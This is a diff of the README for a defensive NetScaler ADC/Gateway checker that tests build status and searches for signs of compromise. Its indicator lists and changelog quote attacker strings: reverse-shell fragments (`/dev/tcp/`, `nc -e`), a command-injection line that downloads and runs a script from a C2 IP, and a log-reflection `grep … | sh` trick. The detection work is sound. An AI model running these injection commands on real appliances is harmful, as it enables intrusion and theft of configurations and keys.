@@ -4,7 +4,7 @@ Read-only precondition and exposure checker for the Citrix NetScaler ADC / NetSc
 
 > ⚠️ **CVE-2026-88771 and CVE-2026-88772 are exploited in the wild** and are listed in the [CISA KEV catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog). Upgrade now, and assume breach on internet-facing appliances.
 
-> 🚨 **CVE-2026-88779 (3 October): the SAML attack now has a fix, and SAML appliances must upgrade again.** The crafted SAML requests that crash patched NetScalers since 2 October are CVE-2026-88779 ([CTX697174](https://support.citrix.com/external/article/CTX697174), CVSS 8.7, targeted attacks; on CISA's Known Exploited Vulnerabilities list since 4 October, US federal deadline 7 October). You are affected if your config has `add authentication samlAction` or `add authentication samlIdPProfile`. Fixed in **14.1-73.41, 13.1-64.28, 14.1-73.41 FIPS and 13.1-37.282 FIPS/NDcPP**, so an appliance already upgraded for CTX697096 must be **upgraded again**. Until then, Citrix offers Global Deny List signatures through NetScaler Console, or a responder policy from Citrix Support. Checker **v1.14** checks your build against these versions, shows whether a SAML mitigation policy covers every Gateway/AAA vserver, and reports injection attempts from 2 October until the CVE-2026-88779 fix as "may have run".
+> 🚨 **CVE-2026-88779 (3 October): the SAML attack now has a fix, and SAML appliances must upgrade again.** The crafted SAML requests that crash patched NetScalers since 2 October are CVE-2026-88779 ([CTX697174](https://support.citrix.com/external/article/CTX697174), CVSS 8.7, targeted attacks; on CISA's Known Exploited Vulnerabilities list since 4 October, US federal deadline 7 October). You are affected if your config has `add authentication samlAction` or `add authentication samlIdPProfile`. Fixed in **14.1-73.41, 13.1-64.28, 14.1-73.41 FIPS and 13.1-37.282 FIPS/NDcPP**, so an appliance already upgraded for CTX697096 must be **upgraded again**. Until then, Citrix offers Global Deny List signatures through NetScaler Console, or a responder policy from Citrix Support. Checker **v1.15** checks your build against these versions, shows whether a SAML mitigation policy covers every Gateway/AAA vserver, and reports injection attempts from 2 October until the CVE-2026-88779 fix as "may have run".
 
 It answers four questions for each NetScaler:
 
@@ -42,6 +42,7 @@ Without switches, the script checks **exposure and fix status**. With `--ioc`, i
 - The FreeBSD Sliver implant's file names (`citrix3.bad`, an executable `/var/tmp/.host`).
 - The `.ctxs.receiver` webshell by name and SHA-256, any other `*.receiver` file in the web folders (randomly named copies, Huntback.io), and PHP or webshell code (`<?php`, `passthru(`, `NSC_TASS`) anywhere in `LogonPoint/custom` or `/var/vpn`, which catches renamed copies.
 - The httpd `Alias`/`AliasMatch` for `receiver.min(.<hex>).css` in `/etc/httpd.conf` or `/nsconfig/httpd.conf`.
+- A package (`.deb`) file in the login-page theme folder (`LogonPoint/custom`, `logon/themes`): the SAML-attack kit (SLAPSHOT) keeps a webshell there as `receiver.deb` (Lupovis).
 - Files written by exploit payloads: the `nx_verify.html` canary, `/var/tmp/wtw*`, `watchTowr*`, `boom*`, and any small recent file in `/tmp`, `/var/tmp` or the web roots that contains `id` output.
 - A setuid `/bin/sh`.
 - `httpd.conf` changes that make a **non-`.php` extension run as PHP** (e.g. `.deb`, `.sig`), or `AliasMatch` rules pointing into Gateway folders such as `vpn/media` or `vpn/scripts` ([Mandiant/GTIG](https://cloud.google.com/blog/topics/threat-intelligence/defending-against-active-exploitation-of-citrix-netscaler-adc-and-gateway-appliances/)).
@@ -76,13 +77,14 @@ Without switches, the script checks **exposure and fix status**. With `--ioc`, i
 **Targeted: attack traffic in the logs**
 - Injected commands in `ns.log`, `/var/log/messages`, `notice.log` and `nsvpn.log` (where the authentication daemon `nsaaad` logs login names): fake `pitboss` messages as the login name (`...unexpectedly died NSPPE;<cmd>` and `...missed too many heartbeatsNSPPE;<cmd>`), `${IFS}` instead of spaces (also URL-encoded), backticks, `$(`, and commands straight after `;` or `|` (including FreeBSD `fetch`). Following [Elastic](https://github.com/elastic/detection-rules/blob/main/rules/network/initial_access_netscaler_log_poisoning_command_injection.toml)'s detection rule, any `pitboss` packet-engine message with a shell character (`;`, backtick, `$(`, `&&`, `||`, or URL-encoded `%3b` `%60` `%7c` `%24%28` `%26%26` `%3e` `%3c`) is also reported, which catches hand-written variants. This is the CVE-2026-88771 technique described by [watchTowr](https://labs.watchtowr.com/oh-look-the-foot-gun-went-off-again-citrix-netscaler-preauth-command-injection-cve-2026-88771/) and [CERT-EU](https://cert.europa.eu/blog/taking-execute-logging-a-bit-too-literally-cve-2026-88771).
 - Base64 commands in the User-Agent, either as `INDEX:<base64>` (CERT-EU two-stage variant) or as the whole User-Agent (Kevin Beaumont), **shown decoded**.
+- **Log-reflection** (Lupovis): a plain-text shell script parked in a tagged User-Agent (`<tag>:<script>`), and the injection that later runs it from the log (`grep <tag>: /var/log/htt* | sed … | sh`). When both are found, the report shows which staged requests carry the tag and from which IPs.
 - Post-exploitation in the shell history (`/var/log/sh.log*`, `bash.log*`): `ldapsearch`, `openssl s_client` and `ns_gui/vpn`, which attackers use to pull AD credentials through the LDAP bind account (Kevin Beaumont).
 - Possible CVE-2026-88772 (DTLS) attempts: DTLSv1.0 handshake failures with "Internal Error", and packet-engine crashes (`exit with orphan rings`, `NOT restarting NSPPE`). When both are present, the output flags it as a likely CVE-2026-88772 attempt (Deyda).
 - Attack payloads in requests to the login pages (`/nf/auth/doAuthentication.do`, `/cgi/login`, `/p/u/doLogon.do`, `tmindex.html`, `GetUserName`) as recorded in the HTTP logs: `pitboss`, `NSPPE`, `%3B`, `%60`, `${IFS}`, `curl`, `wget` or `fetch`. These are still visible after `ns.log` has rotated. Normal requests to these pages are not flagged (Deyda).
-- 106 known attacker IPs and the domains `echvista.com`, `entretiensol.com`, `white-guard.pro`, `gsocket.io`, `pylrk.cc`, `oast.fun`, `dnsl.cc`, `gs.thc.org`, `webhook.site`, `dnshook.site` and five Platypus certificate domains, shown as dated log lines (TENEX, Truesec, eSentire, IFIN, Corelight, Lupovis via PitScaler.com, Gotham Technology Group, Mandiant, Arctic Wolf, Unit 42, Rapid7, Beazley Security, [GreyNoise](https://www.greynoise.io/blog/swarming-against-citrix-0-day-exploitation), [Lupovis](https://x.com/LupovisDefence)), requests to the webshell alias, the `httpworkbench` DNS-exfil domain, the `NX-CVE-OK` canary, the `ns-88771-poc` / `PoCbit` scanner user agents, and payload strings from Arctic Wolf (`xd7h/`, `nsmon`, `update_c08937`, `/dev/tcp/`, `nc -e`, `base64 -w0`, `exec-ok`), the webshell header names `HTTP_X_UX` / `HTTP_NSC_LDAP` / `HTTP_NSC_CLIENTTYPE` and the webshell command cookie `NSC_TASS` in the HTTP logs, and from TENEX `gsocket`, the `platypus-agent` user agent, `/api/v1/agents/enroll`, requests for `LogonUISimple.html.style.min…css` and the `;# NSX<hex>` attempt marker.
+- 131 known attacker IPs and the domains `echvista.com`, `entretiensol.com`, `white-guard.pro`, `gsocket.io`, `pylrk.cc`, `oast.fun`, `dnsl.cc`, `gs.thc.org`, `webhook.site`, `dnshook.site`, `pinggy.net`, `serveousercontent.com` and five Platypus certificate domains, shown as dated log lines (TENEX, Truesec, eSentire, IFIN, Corelight, Lupovis via PitScaler.com, Gotham Technology Group, Mandiant, Arctic Wolf, Unit 42, Rapid7, Beazley Security, [Huntback](https://huntback.io/blog/cve-88771-analysis), [GreyNoise](https://www.greynoise.io/blog/swarming-against-citrix-0-day-exploitation), [Lupovis](https://x.com/LupovisDefence)), requests to the webshell alias, the `httpworkbench` DNS-exfil domain, the `NX-CVE-OK` canary, the `ns-88771-poc` / `PoCbit` scanner user agents, and payload strings from Arctic Wolf (`xd7h/`, `nsmon`, `update_c08937`, `/dev/tcp/`, `nc -e`, `base64 -w0`, `exec-ok`), the webshell header names `HTTP_X_UX` / `HTTP_NSC_LDAP` / `HTTP_NSC_CLIENTTYPE` and the webshell command cookie `NSC_TASS` in the HTTP logs, and from TENEX `gsocket`, the `platypus-agent` user agent, `/api/v1/agents/enroll`, requests for `LogonUISimple.html.style.min…css` and the `;# NSX<hex>` attempt marker.
 - About 60 opportunistic scanner IPs tagged by GreyNoise, in a separate group marked as a hunting lead only (Cloudflare WARP addresses are left out: they are shared by ordinary users).
 - Base64 PHP (`PD9…`) in the User-Agent, e.g. on `/vpn/media/*.ico`: webshell staging through the access log (eSentire), **shown decoded**.
-- Probes: 1-byte `nsepa.deb` pre-checks (HTTP 206), the `vp_probe_nonexist` recon marker, `scanner-probe` logins, and requests for `.ctxs.receiver`, `.slap.receiver` or any other `*.receiver` file in LogonPoint per source IP (Gotham, Huntback.io).
+- Probes: 1-byte `nsepa.deb` pre-checks (HTTP 206), the `vp_probe_nonexist` recon marker, `scanner-probe` logins, and requests for `.ctxs.receiver`, `.slap.receiver` or any other `*.receiver` file, for `receiver(.v2).min.<hex>.css` (also with the `g` suffix scanners add to bypass a CDN cache), and for `receiver.deb` or a random 12-character `.deb` in `LogonPoint/custom` (Lupovis) in LogonPoint per source IP (Gotham, Huntback.io).
 - Requests for `/vpn/c`, the path the stolen-config archive is served from (Rapid7): HTTP 200 is reported as compromise (configuration archive likely downloaded), 404 as a probe. Also web requests to `/nsconmsg` (a CLI tool, never a web path; Corelight), a base64 payload staged in a `K:<base64>#` User-Agent (1 October variant), the `/download/x.sh` payload, the fake `Team-NetScaler-Inventory` user agent, and failed logins from four password-spray sources (all via Gotham).
 - Key and config theft in the shell history: `/flash/nsconfig/keys`, `F1.key`/`F2.key`, `database.php`, `LDAPTLS_REQCERT` (Deyda).
 - Covering tracks in the shell history: `kill` of NetScaler's `customsnmpd` (LevelBlue).
@@ -179,9 +181,12 @@ scp ctx697096_check.sh nsroot@<NSIP>:/var/tmp/
 ssh nsroot@<NSIP>
 > shell
 cd /var/tmp
-sh ctx697096_check.sh            # build + preconditions + partitions + upgrade risks
-sh ctx697096_check.sh --ioc      # also checks for compromise (all public IoCs)
+sh ctx697096_check.sh --summary  # am I fixed? was I hacked? short result on screen, full report in /var/tmp
+sh ctx697096_check.sh            # the same, full report on screen
+sh ctx697096_check.sh --no-ioc   # build + preconditions + partitions + upgrade risks only (no compromise check)
 ```
+
+Since **v1.15** the compromise check (all public IoCs) runs **by default** on the appliance. Before, it needed `--ioc`, and a run without it ended with "fixed build" although the box had never been checked for compromise. `--ioc` is still accepted, so existing scripts and Console jobs keep working.
 
 Save the output for your change record:
 
@@ -194,6 +199,28 @@ Notes:
 - The script reads the **saved** config (`/nsconfig/ns.conf`). Run `save ns config` first if there are unsaved changes.
 - On HA pairs, run it on **both** nodes, especially with `--ioc`.
 - It needs shell access (nsroot, or a superuser account).
+
+### All commands at a glance
+
+```sh
+sh ctx697096_check.sh                                   # full check on the appliance: build, preconditions, compromise check
+sh ctx697096_check.sh --summary                         # short result on screen, full report saved in /var/tmp
+sh ctx697096_check.sh --no-ioc                          # build, preconditions, partitions and upgrade risks only
+sh ctx697096_check.sh --ioc                             # same as the default on the appliance (kept for older scripts and Console jobs)
+sh ctx697096_check.sh --out /var/tmp/report.txt         # also save the report as plain text (also: --out=/var/tmp/report.txt)
+sh ctx697096_check.sh --summary --out /var/tmp/r.txt    # short result on screen, full report in the file you choose
+sh ctx697096_check.sh --days 60                         # look 60 days back for changed files (default 30)
+sh ctx697096_check.sh --fixdate "2026-09-27 16:32"      # set when the fixed build started running, if the detected date is wrong
+sh ctx697096_check.sh --no-banner                       # no start banner
+sh ctx697096_check.sh --hide-ip                         # NSIP shown as "hidden" (for screenshots and reports you share)
+sh ctx697096_check.sh /path/to/ns.conf                  # offline: check an exported config (no compromise check)
+sh ctx697096_check.sh --partition /path/to/ns.conf      # check a single admin partition config
+sh ctx697096_check.sh --version                         # show the version
+sh ctx697096_check.sh --help                            # show the help
+echo $?                                                 # exit code of the last run (see Exit codes)
+```
+
+Options can be combined, e.g. `sh ctx697096_check.sh --summary --days 60 --no-banner`.
 
 ### From NetScaler Console (configuration job)
 
@@ -210,7 +237,7 @@ To check many appliances at once, run the checker as a **configuration job** in 
    With `put`, you choose the local `ctx697096_check.sh`; Console stores it and copies it to every selected instance.
 3. Run the job. If your Console shows the command output (**Details > Execution Summary**), the first line is the result:
    ```
-   CTX697096 checker 1.14: host=ns01 build=14.1-73.37 status=FIXED isn=ENABLED compromise=no targeted=yes,after_fix_only saml=sp cve88779=vulnerable verdict=VULNERABLE_CVE-2026-88779 runtime=23s
+   CTX697096 checker 1.15: host=ns01 nsip=10.0.0.10 build=14.1-73.37 status=FIXED isn=ENABLED compromise=no targeted=yes,after_fix_only saml=sp cve88779=vulnerable verdict=VULNERABLE_CVE-2026-88779 runtime=23s
    ```
    `status` is the CTX697096 status of the build. `saml` is `sp`, `idp`, `sp+idp` or `none`. `cve88779` is `vulnerable`, `fixed`, `n/a` (no SAML) or `unknown`. `verdict` is one of `OK`, `FOLLOW_UP`, `ISN_OPEN`, `TARGETED_BEFORE_FIX`, `TARGETED_SINCE_2OCT`, `VULNERABLE`, `VULNERABLE_CVE-2026-88779`, `COMPROMISED` or `UNKNOWN`.
 4. **Collect the results.** The full report is on each appliance in `/var/tmp/ctx697096_<host>_<date>_<time>.txt`. Copy the reports to a management host with SCP or WinSCP, e.g. `scp nsroot@ns01:/var/tmp/ctx697096_*.txt .`, then list the result of every appliance at once. The result line is the last line of each report:
@@ -248,14 +275,32 @@ The build number is read from the first line of `ns.conf` (`#NS14.1 Build 73.37`
 | Option | Description |
 |---|---|
 | `<path>` | Config file to check (default `/nsconfig/ns.conf`) |
-| `--ioc` | Also check for compromise: all public IoCs, attack traffic before/after the fix, log retention (appliance only) |
+| `--ioc` | Check for compromise: all public IoCs, attack traffic before/after the fix, log retention (appliance only). **Default on the appliance since v1.15**; still accepted |
+| `--no-ioc` | (v1.15) Skip the compromise check: build, preconditions, partitions and upgrade risks only. The verdict then says "NOT checked for compromise" and `--summary` shows `compromise=not_checked` |
 | `--partition <ns.conf>` | Check a single admin partition config |
-| `--out <file>` | Also save the report as plain text (no colours, attacker text defanged), e.g. for the change record |
+| `--out <file>`, `--out=<file>` | Also save the report as plain text (no colours, attacker text defanged), e.g. for the change record |
 | `--summary` | Short summary on screen (one result line, red findings, count of `[CHECK]` items, verdict); the full report is saved on the appliance in `/var/tmp/ctx697096_<host>_<date>_<time>.txt`, or the `--out` file. Made for NetScaler Console configuration jobs and runs across many appliances. The result line is also the last line of the report |
+| `--hide-ip` | (v1.15) The second header line ("Appliance: …") and the `--summary` result line show `NSIP hidden` / `nsip=hidden` instead of the appliance IP. Use it for screenshots and reports you share outside your team |
+| `--no-banner` | (v1.15) No start banner. The banner is only shown when you run the checker by hand in a terminal, and never ends up in a saved report |
 | `--days N` | How far back the "files changed recently" checks look, in the web folders and in `/`, `/var`, `/tmp` and `/var/tmp`. Default 30 days (the whole campaign so far); e.g. `--days 60` to look further back |
 | `--fixdate "YYYY-MM-DD HH:MM"` | Optional: set when the fixed build started running, if the automatic date is wrong. Normally not needed |
 | `--version` | Show the script version |
 | `-h`, `--help` | Show help |
+
+### Environment variables
+
+The same settings can be given as environment variables, e.g. in a Console job: `CTXCHK_DAYS=60 sh ctx697096_check.sh --summary`.
+
+| Variable | Same as / purpose |
+|---|---|
+| `CTXCHK_DAYS=N` | `--days N` |
+| `CTXCHK_FIXDATE="YYYY-MM-DD HH:MM"` | `--fixdate` |
+| `CTXCHK_NOBANNER=1` | `--no-banner` |
+| `CTXCHK_HIDEIP=1` | `--hide-ip` |
+| `CTXCHK_WEBDIRS="dir dir ..."` | Web folders searched for recently changed files (default `/var/netscaler/logon /netscaler/ns_gui /var/vpn`) |
+| `CTXCHK_BOOTTIME=<epoch>`, `CTXCHK_BOOTFILE=<path>` | Testing only: override the boot time and the running kernel file |
+
+`CTXCHK_CHILD` and `CTXCHK_PROGRESS` are set by the script itself for `--out` / `--summary`; do not set them.
 
 ### Output labels
 
@@ -282,38 +327,19 @@ The build number is read from the first line of `ns.conf` (`#NS14.1 Build 73.37`
 
 ## Example output
 
-```text
-CTX697096 + CTX697174 precondition check  (config: fw01-ns.conf, host: ns01, 2026-09-28 13:21)
-============================================================================
-Build
-  [AFFECTED] Running 13.1-58.21 - VULNERABLE. Fixed in 13.1-64.24 or later - install 13.1-64.28 (also fixes CVE-2026-88779).
+Since v1.15 the compromise check runs by default on the appliance, so a normal run shows the build, the preconditions **and** the IoC sweep. Names and IPs below are changed; the start banner (terminal only) is left out.
 
-Preconditions (CTX697096)
-  [AFFECTED] CVE-2026-88771 (RCE, 9.5, EXPLOITED) - applies to ALL deployments, no workaround
-  [AFFECTED] CVE-2026-88772 (RCE, 9.5, EXPLOITED) - DTLS enabled:
-             | add vpn vserver gw1 SSL 10.0.0.1 443 -Listenpolicy NONE
-  [AFFECTED] CVE-2026-88773 (HTTP request smuggling, 9.3) - 4 HTTP/SSL vserver(s)
-  ...
-  [AFFECTED] CVE-2026-88778 (TCP ISN prediction, 8.8) - TCP vservers present, Enhanced ISN not enabled in config
-
-CVE-2026-88779 (CTX697174, SAML - separate bulletin, not part of CTX697096)
-  [AFFECTED] CVE-2026-88779 (SAML memory overflow/DoS, 8.7, targeted attacks) - SAML configured (samlAction=1 samlIdPProfile=0) and build below 13.1-64.28. Upgrade to 13.1-64.28 or later.
-
-Upgrade risk
-  [CHECK]    NS variables configured - upgrade straight to 13.1-64.24, do NOT use a 64.23 build:
-  [CHECK]    SAML action(s) accept UNSIGNED assertions. After upgrade this is forced ON -
-
-============================================================================
-VERDICT: VULNERABLE - upgrade now. CVE-2026-88771 and -88772 are exploited in the wild.
-```
-
-With `--ioc` on a patched appliance (shortened, names and IPs changed):
+**On a patched appliance** (`sh ctx697096_check.sh`, shortened):
 
 ```text
+CTX697096 + CTX697174 precondition check v1.15 (indicators up to 8 Oct 2026)
+Appliance: ns01  -  NSIP 10.0.0.10  -  config /nsconfig/ns.conf  -  2026-10-08 10:44
+============================================================================
 Build
   [fixed]    Running 14.1-73.41 - includes the CTX697096 and CVE-2026-88779 fixes.
 
 Preconditions (CTX697096)
+  (build is fixed - [met/fixed] lines show exposure before the upgrade; only CVE-2026-88778 needs a config change)
   [met/fixed] CVE-2026-88771 (RCE, 9.5, EXPLOITED) - applies to ALL deployments, no workaround - mitigated by fixed build
   [met/fixed] CVE-2026-88772 (RCE, 9.5, EXPLOITED) - DTLS enabled - mitigated by fixed build:
   ...
@@ -322,24 +348,91 @@ Preconditions (CTX697096)
 CVE-2026-88779 (CTX697174, SAML - separate bulletin, not part of CTX697096)
   [fixed]    CVE-2026-88779 - SAML configured (samlAction=1 samlIdPProfile=0), build includes the fix
 
-IoC sweep (public indicators - use together with the official Citrix IoC scan)
-  [OK]       Fixed build running since 2026-09-28 15:20 (first boot after the install) - exposure window ended here
-  [OK]       Last boot 2026-09-28 15:18 (after the fixed-build install)
-  [CHECK]    ns.log keeps only ~24 hours of history (oldest file 2026-09-27 17:00)
-             | Log-based checks cannot see further back. Forward logs to a SIEM / syslog server.
-  [OK]       432 web files rewritten together on 2026-09-24 16:03 - whole theme/system rewrite (expected)
-  [OK]       Web files written during the firmware upgrade / reboot (expected):
-             | 2026-09-28 15:17  /var/netscaler/logon/themes/EULA/resources/en.xml
-             | ... and 11 more
-  [OK]       Language loader files identical to the unchanged ones in their folder (standard Citrix template):
-             | 2026-09-22 22:00  /var/netscaler/logon/LogonPoint/custom/strings.ko.js
-  [OK]       No crontab for user 'nobody'
-  [OK]       8524 successful VPN requests from non-Receiver clients - all normal logon-page paths
-             | NOTE: >=95% from one IP - client IPs are probably hidden by NAT; use firewall logs
-  [OK]       No shell metacharacters in logon-related ns.log entries
+Upgrade risk
+  [OK]       No 13.1-64.23 upgrade risk
 
+Hardening (recommended - does not change the verdict)
+  [TIP]      IP Reputation is not used - recommended: drop requests from known-bad IPs (scanners, botnets) before they reach the Gateway:
+
+IoC sweep (public indicators - use together with the official Citrix IoC scan)
+  [OK]       Fixed build running since 2026-09-27 16:29 (install time of ns-14.1-73.37.gz, the first fixed build still in /flash) - exposure window ended here
+  [OK]       Last boot 2026-10-04 11:31 (after the fixed-build install)
+  [CHECK]    ns.log keeps only ~24 hours of history (oldest file 2026-10-06 21:00)
+             | Log-based checks cannot see further back. Forward logs to a SIEM / syslog server.
+  ... [1/6] Files: web folders, temp folders, known hashes               0:00
+  [OK]       45 web files rewritten together on 2026-10-03 16:25 - whole theme/system rewrite (expected)
+  [OK]       Web files rewritten together across folders or with their whole folder - content checked, nothing suspicious (system / theme / EULA save):
+  ... [2/6] Persistence: cron, startup files, processes                  0:01
+  ... [3/6] Logs: HTTP errors, VPN clients, login-page injection         0:02
+  ... [4/6] Logs: 131 attacker IPs, 17 domains, ~93 scanners             0:14
+  ... [5/6] Logs: webshell requests, payloads, shell history             0:16
+  [CHECK]    Exploitation traffic for CVE-2026-88771/88772 in the logs - all dated lines are AFTER the fixed build started running (2026-09-27 16:29):
+             | known exploitation IP 203.0.113.55 (2 line(s)):
+             | [after fix] 203.0.113.55 -> 10.0.0.90 - - [28/Sep/2026:21:48:58 +0000] "GET /logon/themes/Default/receiver.min.d0f4da26353fbbc4.css HTTP/1.1" 404 236 ...
+             | Attempts after the fix - before 2 Oct, or after the CVE-2026-88779 fix - could not run commands. A 404 on a canary/alias check confirms it failed.
+  ... [6/6] Live state, users and saved configs                          0:17
+  [OK]       No local system users besides nsroot in ns.conf (also check 'show system user' for unsaved ones)
+  [OK]       No Perl scripts, processes or start-up lines outside NetScaler's own files
+
+Done in 18s (expected 5s-22s). Checker v1.15 checked 131 attacker IPs, 17 domains, 38 hashes and all public indicators up to 8 Oct 2026.
+============================================================================
+VERDICT: fixed build, but follow-up items above need attention.
+```
+
+**On a brand-new appliance** that never ran a vulnerable build, the same run ends green:
+
+```text
+  [OK]       Short log history (ns.log, notice.log, httpaccess-vpn.log) - fine here: this appliance never ran a vulnerable build
+  ...
+  [OK]       No public CVE-2026-88771/88772 indicators (webshells, dropped files, persistence, 131 known attacker IPs + GreyNoise scanners, probe/canary/scanner strings)
+  [OK]       No Perl scripts, processes or start-up lines outside NetScaler's own files
+
+Done in 8s (expected 5s-20s). Checker v1.15 checked 131 attacker IPs, 17 domains, 38 hashes and all public indicators up to 8 Oct 2026.
 ============================================================================
 VERDICT: fixed build, no follow-up flagged.
+If this box was internet-facing before patching, also run the official Citrix IoC scan.
+```
+
+**With `--summary`** (one result line on screen, full report saved):
+
+```text
+CTX697096 checker 1.15: host=ns01 nsip=10.0.0.10 build=14.1-73.41 status=FIXED isn=n/a compromise=no targeted=yes,after_fix_only saml=sp cve88779=fixed verdict=FOLLOW_UP runtime=18s
+  2 [CHECK] item(s) to review in the full report:
+    - ns.log keeps only ~24 hours of history (oldest file 2026-10-06 21:00)
+    - Exploitation traffic for CVE-2026-88771/88772 in the logs - all dated lines are AFTER the fixed build ...
+VERDICT: fixed build, but follow-up items above need attention.
+Full report on this appliance: /var/tmp/ctx697096_ns01_20261007_2144.txt (attacker text defanged)
+```
+
+**When the compromise check did not run**, the verdict says so. With `--no-ioc` on the appliance:
+
+```text
+VERDICT: fixed build - but NOT checked for compromise (--no-ioc).
+Was this box hacked before the fix? Run:  sh ctx697096_check.sh --summary
+```
+
+**Offline, against an exported config** of a vulnerable appliance (`sh ctx697096_check.sh fw01-ns.conf`, no IoC sweep possible):
+
+```text
+CTX697096 + CTX697174 precondition check v1.15 (indicators up to 8 Oct 2026)
+Appliance: admin-pc  -  NSIP 10.0.0.1  -  config fw01-ns.conf  -  2026-10-08 13:21
+============================================================================
+Build
+  [AFFECTED] Running 13.1-58.21 - VULNERABLE. Fixed in 13.1-64.24 or later - install 13.1-64.28 (also fixes CVE-2026-88779).
+
+Preconditions (CTX697096)
+  [AFFECTED] CVE-2026-88771 (RCE, 9.5, EXPLOITED) - applies to ALL deployments, no workaround
+  [AFFECTED] CVE-2026-88772 (RCE, 9.5, EXPLOITED) - DTLS enabled:
+             | add vpn vserver gw1 SSL 10.0.0.1 443 -Listenpolicy NONE
+  ...
+  [AFFECTED] CVE-2026-88778 (TCP ISN prediction, 8.8) - TCP vservers present, Enhanced ISN not enabled in config
+
+CVE-2026-88779 (CTX697174, SAML - separate bulletin, not part of CTX697096)
+  [AFFECTED] CVE-2026-88779 (SAML memory overflow/DoS, 8.7, targeted attacks) - SAML configured (samlAction=1 samlIdPProfile=0) and build below 13.1-64.28. Upgrade to 13.1-64.28 or later.
+
+============================================================================
+(Compromise NOT checked: offline config - run on the appliance. Upgrading does not remove an attacker who is already in.)
+VERDICT: VULNERABLE - upgrade now. The fixed build covers all eight CVEs in CTX697096; CVE-2026-88771 and -88772 are exploited in the wild.
 ```
 
 ---
@@ -365,12 +458,41 @@ GUI: **Configuration > System > Settings > Change TCP Parameters**, tick **Enhan
 2. **Run the official Citrix IoC scan** (NetScaler Console or Citrix Support) **before** any reboot.
 3. **Run this script** to see which preconditions apply and to plan the upgrade.
 4. **Upgrade** to the fixed build (with SAML: the CVE-2026-88779 build, 14.1-73.41 / 13.1-64.28), and enable Enhanced ISN Generation.
-5. If anything suspicious was found, **treat the appliance as compromised** and follow [CTX694799 – Steps to take if NetScaler ADC is suspected to be compromised](https://support.citrix.com/external/article/CTX694799/steps-to-take-if-netscaler-adc-is-suspec.html).
+5. **New cloud VPX?** As of 7 October the public Marketplace images in Azure (14.1-66.59), AWS (14.1-73.30, listing closed for new subscriptions) and Google Cloud (14.1-73.30 and older, FIPS 14.1-72.61) were all **below the fixed builds**. Deploy without a public IP, upgrade to 14.1-73.41 first, run the checker, then expose it.
+6. **Reduce exposure:** block outbound traffic from NSIP/SNIP except what the NetScaler needs, and turn on [IP Reputation](https://docs.netscaler.com/en-us/citrix-adc/current-release/reputation/ip-reputation.html) to drop requests from known-bad IPs (`enable ns feature reputation`, a responder policy with `CLIENT.IP.SRC.IPREP_IS_MALICIOUS` and action `DROP`, bound to the Gateway/LB vservers). It needs a Premium licence and HTTPS from the NSIP to `api.bcss.brightcloud.com`. It does not replace the upgrade.
+7. If anything suspicious was found, **treat the appliance as compromised** and follow [CTX694799 – Steps to take if NetScaler ADC is suspected to be compromised](https://support.citrix.com/external/article/CTX694799/steps-to-take-if-netscaler-adc-is-suspec.html).
 
 ---
 
 ## Changelog
 
+- **v1.15** (2026-10-08): **WHIPSHOT / SLAPSHOT scanning (Lupovis).**
+  - Lupovis (5 October) shows that scanning for these webshells started before Mandiant published them, and that since 4 October a 10-step scan asks for randomly named variants on every target. Scanning is not compromise: these requests are listed as **targeted**, with the source IPs.
+  - **New probe check:** requests for `receiver.deb` or a random 12-character `.deb` in `/logon/LogonPoint/custom/`.
+  - **`g` suffix:** requests for `receiver.min.<hex>g.css` and `receiver.v2.min.<hex>g.css` (the scan adds a `g` to test whether a CDN or WAF answers from its cache) now count as exploit strings. In a test set of real logs, such requests from 28 and 29 September were missed by v1.14.
+  - **Log-reflection (Lupovis, 7 October):** two actors park a whole shell script in the User-Agent of a GET request, tagged `<tag>:<script>`, so it is written to `/var/log/httpaccess*`. The CVE-2026-88771 injection then only carries `grep <tag>: /var/log/htt* | sed … | sh` and runs the script from the log, so filters that inspect the login field never see the payload. New **targeted** check for plain-text shell scripts in a tagged User-Agent (the base64 forms `INDEX:` and `K:` were already covered), `/var/log/htt` in an injection counts as an exploit string, and the report links each injected tag to the staged requests and their source IPs. If the shell audit log shows the command ran, it is reported as compromise, as before. The second actor base64-encodes the script (`<tag>:<base64>`): those values are decoded and the decoded command is shown. Lupovis also confirms that one actor's extracted script is the config and SSL-key theft payload detected since v1.14 (ns.conf and keys in a random `.css` in LogonPoint, sent to port 8877).
+  - **"NetScaler C2" framework (SOCRadar, 7 October):** an automated tool that injects `curl${IFS}-sk${IFS}45.143.130[.]195:8899/s/<id>|sh` through CVE-2026-88771 and installs a polling agent with HTTP and DNS command channels. **45.143.130.195** added; the agent file `/tmp/.nsagent` (or a running `.nsagent` process) is reported as **compromise**; the C2 paths `:8899/s/`, `/a/`, `/p/`, `/c/`, `/r/`, the DNS beacon `.p1.oob.` and `nslookup${IFS}` count as exploit strings.
+  - **Compromise check on by default:** on the appliance, the IoC sweep now runs without `--ioc` (field case: a customer ran the build check alone and read "fixed build" as "not hacked"). `--no-ioc` skips it; the verdict then says **"NOT checked for compromise"** and `--summary` shows `compromise=not_checked verdict=OK_IOC_NOT_RUN`. An exported config checked offline says the same. `--ioc` is still accepted.
+  - **Version on screen:** the first line of every run shows the checker version and the indicator date (`precondition check v1.15 (indicators up to 8 Oct 2026)`), and so does the "Done in" line. When the copy is more than 7 days older than today, a yellow line (also in `--summary`) points to GitHub for a newer version.
+  - **No false COMPROMISED from saved reports (field case):** the content checks in `/tmp`, `/var/tmp`, `/` and `/var` (SLAPSHOT marker, Platypus bootstrap, one-line webshell, `uid=` output, EPA batch file, download-and-run scripts) now skip saved checker reports under any file name (recognised by their first line), the checker itself and other triage scripts. A v1.14 report saved as `/var/tmp/v114.txt` had been flagged as a SLAPSHOT marker and a Platypus bootstrap script.
+  - **No false "payload reached a shell":** NetScaler's own boot command `NSPPE_CPUID_OVERRIDE_NEEDED=$(sysctl …)` in the shell audit log no longer counts as attacker trigger text; the trigger is now `pitboss`, `unexpectedly died` or `NSPPE(-n);`.
+  - **Theme folders:** the WHIPSHOT/SLAPSHOT scans also request `/logon/themes/<theme>/receiver(.v2).min.<hex>[g].css`, `.receiver` and `receiver.deb` (seen in the field); these are now matched as well as `LogonPoint/custom`. **23.234.80.205** added (field report: LogonUISimple webshell-alias probes, 7 Oct).
+  - **Perl inventory:** a `[CHECK]` lists Perl scripts, processes, start-up lines and `perl -e` / `| perl` shell history outside NetScaler's own files (field case: another IoC scanner reported only a "Perl" finding). Known bad Perl stays red.
+  - **Hardening tip:** a new "Hardening" section recommends IP Reputation when no responder/WAF policy uses it. It never changes the verdict or the exit code.
